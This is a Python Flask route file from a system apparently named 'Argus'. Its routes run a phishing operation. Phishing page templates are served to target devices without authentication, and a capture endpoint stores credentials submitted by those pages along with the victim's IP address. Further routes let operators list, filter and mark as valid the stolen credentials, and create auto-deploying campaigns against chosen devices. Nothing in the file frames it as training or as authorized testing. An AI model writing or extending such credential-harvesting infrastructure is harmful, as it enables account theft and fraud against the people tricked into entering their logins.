"""
Phishing API Routes - Rotas para gerenciamento de phishing
Sistema Argus - Nível Militar
"""

from flask import Blueprint, jsonify, request, session, render_template, make_response
from datetime import datetime
import logging

from backend.phishing.phishing_manager import PhishingManager

logger = logging.getLogger(__name__)

# Criar Blueprint
phishing_bp = Blueprint('phishing', __name__, url_prefix='/api/phishing')

# Inicializar manager
phishing_manager = PhishingManager()

def login_required(f):
    """Decorator para rotas que requerem autenticação"""
    def decorated_function(*args, **kwargs):
        if 'username' not in session:
            return jsonify({'error': 'Unauthorized'}), 401
        return f(*args, **kwargs)
    decorated_function.__name__ = f.__name__
    return decorated_function

# ====================== TEMPLATES ======================

@phishing_bp.route('/templates', methods=['GET'])
@login_required
def list_templates():
    """Lista todos os templates disponíveis"""
    try:
        templates = phishing_manager.get_available_templates()
        return jsonify(templates)
    except Exception as e:
        logger.error(f"Erro ao listar templates: {e}")
        return jsonify({'error': str(e)}), 500

@phishing_bp.route('/templates/<platform>', methods=['GET'])
def get_template(platform):
    """
    Retorna um template específico
    Sem autenticação para permitir acesso do dispositivo
    """
    try:
        device_id = request.headers.get('X-Device-ID')
        content = phishing_manager.serve_phishing_page(platform, device_id)
        
        if not content:
            return jsonify({'error': 'Template not found'}), 404
        
        # Retornar como HTML
        response = make_response(content)
        response.headers['Content-Type'] = 'text/html; charset=utf-8'
        return response
        
    except Exception as e:
        logger.error(f"Erro ao servir template: {e}")
        return jsonify({'error': str(e)}), 500

@phishing_bp.route('/templates/<platform>/preview', methods=['GET'])
@login_required
def preview_template(platform):
    """Preview de um template (autenticado)"""
    try:
        content = phishing_manager.get_template_content(platform)
        
        if not content:
            return jsonify({'error': 'Template not found'}), 404
        
        # Retornar como HTML
        response = make_response(content)
        response.headers['Content-Type'] = 'text/html; charset=utf-8'
        return response
        
    except Exception as e:
        logger.error(f"Erro ao preview do template: {e}")
        return jsonify({'error': str(e)}), 500

@phishing_bp.route('/templates/custom', methods=['POST'])
@login_required
def create_custom_template():
    """Cria template customizado"""
    try:
        data = request.json
        
        name = data.get('name')
        platform = data.get('platform')
        html_content = data.get('html_content')
        
        if not all([name, platform, html_content]):
            return jsonify({'error': 'Missing required fields'}), 400
        
        success = phishing_manager.create_custom_template(name, platform, html_content)
        
        if success:
            return jsonify({'status': 'success', 'message': 'Template created'})
        else:
            return jsonify({'error': 'Failed to create template'}), 500
            
    except Exception as e:
        logger.error(f"Erro ao criar template customizado: {e}")
        return jsonify({'error': str(e)}), 500

# ====================== CAPTURE ======================

@phishing_bp.route('/capture', methods=['POST'])
def capture_credentials():
    """
    Endpoint para capturar credenciais
    Chamado pelo JavaScript dos templates de phishing
    """
    try:
        device_id = request.headers.get('X-Device-ID')
        ip_address = request.remote_addr
        
        if not device_id:
            device_id = request.json.get('device_id', 'unknown')
        
        credentials = request.json
        credentials['ip_address'] = ip_address
        
        platform = credentials.get('platform')
        
        if not platform:
            return jsonify({'error': 'Platform not specified'}), 400
        
        result = phishing_manager.capture_credentials(device_id, platform, credentials)
        
        if result['status'] == 'success':
            logger.info(f"Credencial capturada: {platform} - Device {device_id}")
            return jsonify(result)
        else:
            return jsonify(result), 500
            
    except Exception as e:
        logger.error(f"Erro ao capturar credenciais: {e}")
        return jsonify({'error': str(e)}), 500

# ====================== CREDENTIALS ======================

@phishing_bp.route('/credentials', methods=['GET'])
@login_required
def list_credentials():
    """Lista credenciais capturadas"""
    try:
        platform = request.args.get('platform')
        device_id = request.args.get('device_id')
        only_valid = request.args.get('only_valid', 'false').lower() == 'true'
        
        credentials = phishing_manager.get_captured_credentials(
            platform=platform,
            device_id=device_id,
            only_valid=only_valid
        )
        
        return jsonify(credentials)
        
    except Exception as e:
        logger.error(f"Erro ao listar credenciais: {e}")
        return jsonify({'error': str(e)}), 500

@phishing_bp.route('/credentials/<credential_id>/validate', methods=['POST'])
@login_required
def validate_credential(credential_id):
    """Valida uma credencial"""
    try:
        data = request.json
        is_valid = data.get('is_valid', False)
        notes = data.get('notes')
        
        success = phishing_manager.validate_credential(credential_id, is_valid, notes)
        
        if success:
            return jsonify({'status': 'success'})
        else:
            return jsonify({'error': 'Credential not found'}), 404
            
    except Exception as e:
        logger.error(f"Erro ao validar credencial: {e}")
        return jsonify({'error': str(e)}), 500

# ====================== STATISTICS ======================

@phishing_bp.route('/statistics', methods=['GET'])
@login_required
def get_statistics():
    """Retorna estatísticas de phishing"""
    try:
        stats = phishing_manager.get_phishing_statistics()
        return jsonify(stats)
    except Exception as e:
        logger.error(f"Erro ao gerar estatísticas: {e}")
        return jsonify({'error': str(e)}), 500

# ====================== CAMPAIGNS ======================

@phishing_bp.route('/campaigns', methods=['GET', 'POST'])
@login_required
def campaigns():
    """
    GET: Lista campanhas
    POST: Cria nova campanha
    """
    if request.method == 'POST':
        try:
            from database.backend.models_military import PhishingCampaign
            from database.backend.models import db
            
            data = request.json
            
            campaign = PhishingCampaign(
                name=data['name'],
                description=data.get('description'),
                target_platform=data['target_platform'],
                template_name=data['template_name'],
                custom_template=data.get('custom_template'),
                auto_deploy=data.get('auto_deploy', False),
                target_devices=data.get('target_devices')
            )
            
            db.session.add(campaign)
            db.session.commit()
            
            return jsonify({
                'status': 'success',
                'campaign': campaign.to_dict()
            }), 201
            
        except Exception as e:
            logger.error(f"Erro ao criar campanha: {e}")
            return jsonify({'error': str(e)}), 500
    
    else:  # GET
        try:
            from database.backend.models_military import PhishingCampaign
            
            campaigns_list = PhishingCampaign.query.all()
            return jsonify([c.to_dict() for c in campaigns_list])
            
        except Exception as e:
            logger.error(f"Erro ao listar campanhas: {e}")
            return jsonify({'error': str(e)}), 500

@phishing_bp.route('/campaigns/<campaign_id>', methods=['GET', 'PUT', 'DELETE'])
@login_required
def campaign_detail(campaign_id):
    """
    GET: Detalhes da campanha
    PUT: Atualiza campanha
    DELETE: Remove campanha
    """
    try:
        from database.backend.models_military import PhishingCampaign
        from database.backend.models import db
        
        campaign = PhishingCampaign.query.filter_by(campaign_id=campaign_id).first()
        
        if not campaign:
            return jsonify({'error': 'Campaign not found'}), 404
        
        if request.method == 'GET':
            return jsonify(campaign.to_dict())
        
        elif request.method == 'PUT':
            data = request.json
            
            if 'name' in data:
                campaign.name = data['name']
            if 'description' in data:
                campaign.description = data['description']
            if 'is_active' in data:
                campaign.is_active = data['is_active']
            if 'target_devices' in data:
                campaign.target_devices = data['target_devices']
            
            db.session.commit()
            return jsonify({'status': 'success', 'campaign': campaign.to_dict()})
        
        elif request.method == 'DELETE':
            db.session.delete(campaign)
            db.session.commit()
            return jsonify({'status': 'success'})
            
    except Exception as e:
        logger.error(f"Erro em campaign_detail: {e}")
        return jsonify({'error': str(e)}), 500

# ====================== WEB UI ======================

@phishing_bp.route('/dashboard', methods=['GET'])
@login_required
def phishing_dashboard():
    """Dashboard de phishing"""
    return render_template('phishing/dashboard.html')

def register_phishing_routes(app):
    """Registra rotas de phishing na aplicação Flask"""
    # Inicializar manager com app
    phishing_manager.init_app(app)
    
    # Registrar blueprint
    app.register_blueprint(phishing_bp)
    
    logger.info("Rotas de phishing registradas com sucesso")

